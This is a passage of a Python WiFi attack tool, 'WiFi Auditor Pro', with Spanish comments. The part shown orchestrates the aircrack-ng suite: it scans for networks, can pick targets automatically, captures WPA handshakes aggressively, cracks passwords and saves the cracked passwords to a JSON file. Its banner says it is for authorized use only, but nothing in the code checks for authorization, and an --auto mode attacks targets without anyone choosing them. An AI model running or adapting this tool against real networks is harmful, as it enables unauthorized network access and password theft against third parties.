        """Limpieza del sistema"""
        self.log("Limpiando sistema...", "INFO")
        self.running = False
        
        # Matar procesos
        subprocess.run("pkill -f airodump-ng", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run("pkill -f aireplay-ng", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run("pkill -f aircrack-ng", shell=True, stderr=subprocess.DEVNULL)
        
        # Restaurar interfaz
        if self.monitor_interface:
            subprocess.run(f"airmon-ng stop {self.monitor_interface}", shell=True, stdout=subprocess.DEVNULL)
        
        self.log("Limpieza completada", "SUCCESS")

    def save_results(self):
        """Guardar resultados de la auditoría"""
        if self.cracked_networks:
            results = {
                'session': datetime.now().isoformat(),
                'networks': self.cracked_networks
            }
            
            result_file = f"audit_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(result_file, 'w') as f:
                json.dump(results, f, indent=4)
            
            self.log(f"Resultados guardados en: {result_file}", "SUCCESS")

    def run_audit(self):
        """Ejecutar auditoría completa"""
        self.log("Iniciando WiFi Auditor Pro v2.0 - Simplificado", "INFO")
        
        # Verificaciones iniciales
        self.check_root()
        if not self.check_dependencies():
            return False
        
        # Configurar interfaz
        if not self.select_interface():
            return False
        
        if not self.enable_monitor_mode():
            return False
        
        try:
            # Escanear redes
            if not self.scan_networks():
                return False
            
            # Seleccionar objetivos
            auto_mode = self.config.get('auto_target_selection', False)
            selected_targets = self.select_targets(auto_mode=auto_mode)
            if not selected_targets:
                self.log("No se seleccionaron objetivos", "WARNING")
                return False
            
            self.targets = selected_targets
            
            # Auditar cada objetivo
            for i, target in enumerate(self.targets, 1):
                if not self.running:
                    break
                
                self.log(f"Auditando objetivo {i}/{len(self.targets)}: {target['essid']}", "INFO")
                
                # Capturar handshake
                handshake_file = self.aggressive_handshake_capture(target)
                
                # Crackear si se configuró
                auto_crack = self.config.get('auto_crack', True)
                if handshake_file and auto_crack:
                    password = self.crack_handshake(target, handshake_file)
                    if password:
                        self.log(f"\n💪 TARGET COMPROMETIDO: {target['essid']} -> {password} 💪\n", "SUCCESS")
        
        finally:
            # Guardar resultados y limpiar
            self.save_results()
            self.cleanup()
        
        return True

def main():
    parser = argparse.ArgumentParser(description='WiFi Auditor Pro v2.0 - Simplificado')
    parser.add_argument('-i', '--interface', help='Interfaz WiFi a usar')
    parser.add_argument('-t', '--time', type=int, default=30, help='Tiempo de escaneo en segundos')
    parser.add_argument('--no-crack', action='store_true', help='Solo capturar handshakes, no crackear')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verboso')
    parser.add_argument('--auto', action='store_true', help='Modo completamente automático')
    parser.add_argument('--max-targets', type=int, default=5, help='Máximo número de objetivos automáticos')
    
    args = parser.parse_args()
    
    # Banner
    print(f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════╗
║     WiFi Auditor Pro v2.0            ║
║     Versión Simplificada             ║
╚══════════════════════════════════════╝
{Colors.END}
{Colors.GREEN}Auditoría de seguridad WiFi profesional{Colors.END}
{Colors.YELLOW}Uso exclusivo para evaluación autorizada{Colors.END}
""")
    
    auditor = WiFiAuditor()
    
    # Aplicar argumentos
    if args.interface:
        auditor.interface = args.interface
    
    if args.time:
        auditor.config['scan_time'] = args.time
    
    if args.no_crack:
        auditor.config['auto_crack'] = False
    
    if args.verbose:
        auditor.config['verbose'] = True
    
    # Configuraciones para modo automático
    if args.auto:
        auditor.config['auto_target_selection'] = True
        auditor.config['auto_crack'] = True
        auditor.config['verbose'] = True
        auditor.log("=== MODO AUTOMÁTICO ACTIVADO ===", "SUCCESS")
    
    if args.max_targets:
        auditor.config['max_auto_targets'] = args.max_targets
    
    # Ejecutar auditoría
    try:
        auditor.run_audit()
    except KeyboardInterrupt:
        auditor.log("Auditoría interrumpida por el usuario", "WARNING")
    except Exception as e:
        auditor.log(f"Error inesperado: {e}", "ERROR")
    finally:
        auditor.cleanup()

if __name__ == "__main__":
    main()
